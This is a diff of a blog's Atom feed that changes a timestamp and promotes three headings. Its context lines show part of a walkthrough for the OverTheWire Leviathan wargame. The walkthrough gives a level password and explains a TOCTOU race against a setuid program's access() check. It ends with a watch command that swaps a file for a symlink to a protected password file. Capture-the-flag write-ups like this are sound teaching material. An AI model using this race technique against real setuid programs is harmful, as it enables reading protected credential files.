@@ -9,7 +9,7 @@
   </author>
   <icon>https://l1ge.github.io/image/brand/icon-1-1.png</icon>
   <logo>https://l1ge.github.io/image/brand/icon-2-1.png</logo>
-  <updated>2020-05-19T18:32:59Z</updated>
+  <updated>2020-05-19T18:35:29Z</updated>
   <link rel="self" type="application/atom+xml" href="https://l1ge.github.io/feed.atom" hreflang="en-us"/>
   <link rel="alternate" type="text/html" href="https://l1ge.github.io/" hreflang="en-us"/>
   <entry>
@@ -321,7 +321,7 @@ user2
 <p>ssh -p 2223 leviathan2@leviathan.labs.overthewire.org</p>
 <p>password: ougahZi8Ta</p>
 </blockquote>
-<h2>Recon</h2>
+<h1>Recon</h1>
 <p>In the home folder there is an executable named <code>printfile</code>. Let's check its permissions</p>
 <pre><code class="language-bash">$ ls -l
 total 8
@@ -383,7 +383,7 @@ exit_group(1)                           = ?
 <pre><code class="language-bash">access(&quot;/etc/leviathan_pass/leviathan3&quot;, R_OK) = -1 EACCES (Permission denied)
 </code></pre>
 <p>There is an <em>access()</em> function that checks if I can access the file. Let's investigate how that function works.</p>
-<h2>Researches</h2>
+<h1>Researches</h1>
 <p>From this <a href="https://linux.die.net/man/2/access">link</a> I get a few interesting informations:</p>
 <blockquote>
 <p>The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. This allows set-user-ID programs to easily determine the invoking user's authority.</p>
@@ -398,7 +398,7 @@ I decide to Google more and I discovered that this kind of vulnerabilities was c
 <p>The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access. But this happens so fast, how can I do that ?</p>
 <p>That's when it becomes fun. I could have made a script but in the intro of the Leviathan's series, its said you don't need to write scripts to solve any of the level.</p>
 <p>Instead I did it... manually.</p>
-<h2>Exploit</h2>
+<h1>Exploit</h1>
 <p>I used <code>tmux</code> to be able to launch two commands simultaneously. You can also use <code>screen</code></p>
 <pre><code class="language-bash">$watch -n 0.1 &quot;touch /tmp/l1ge/lev3; ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3; rm /tmp/l1ge/lev3&quot;
 </code></pre>
